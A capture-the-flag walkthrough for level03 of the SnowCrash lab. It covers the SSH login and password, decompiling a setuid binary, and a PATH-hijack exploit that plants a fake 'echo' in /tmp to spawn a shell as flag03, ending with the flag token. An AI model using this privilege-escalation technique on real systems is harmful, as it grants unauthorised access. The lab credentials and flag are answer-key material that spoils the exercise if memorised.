# Level03

## How to Login

To access the system, use the following SSH command:

```bash
ssh level03@192.168.56.104 -p 4242
password: kooda2puivaav1idi4f57q8iq
```

## How to Get the Flag

Upon logging in, navigate to your home directory where you will find a binary file named `level03`.

### Analyzing the Binary

1. **Download the Binary**: Use `scp` to download the `level03` binary to your local machine for analysis.

   ```bash
   scp -P 4242 level03@192.168.56.104:level03 .
   ```

2. **Decompile the Binary**: Upload the `level03` binary to a tool like Binary Ninja to decompile and analyze it. Upon examination, you'll find the following command inside the binary:

   ```bash
   /usr/bin/env echo Exploit me.
   ```

   This indicates that the binary uses the `echo` command.

### Exploiting the Binary

To exploit the binary, we can manipulate the `echo` command to execute a shell.

1. **Create a Custom `echo`**: In the `/tmp` directory, create a file named `echo` that contains the path to the Bash shell.

   ```bash
   echo /bin/bash > /tmp/echo
   ```

2. **Set Execute Permissions**: Make the custom `echo` file executable.

   ```bash
   chmod +x /tmp/echo
   ```

3. **Modify PATH Environment Variable**: Prepend the `/tmp` directory to the `PATH` environment variable to ensure our custom `echo` is used first.

   ```bash
   export PATH=/tmp:$PATH
   ```

4. **Execute the Binary**: Run the `level03` binary.

   ```bash
   ./level03
   ```

   You should see the following output:

   ```
   bash: /home/user/level03/.bashrc: Permission denied
   flag03@SnowCrash:~$
   ```

   Despite the permission denied error for the `.bashrc` file, you will be logged in as `flag03`.

5. **Retrieve the Flag**: Use the `getflag` command to obtain the flag.

   ```bash
   getflag
   ```

   The command will return the flag:

   ```
   Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
   ```

You have successfully completed Level03.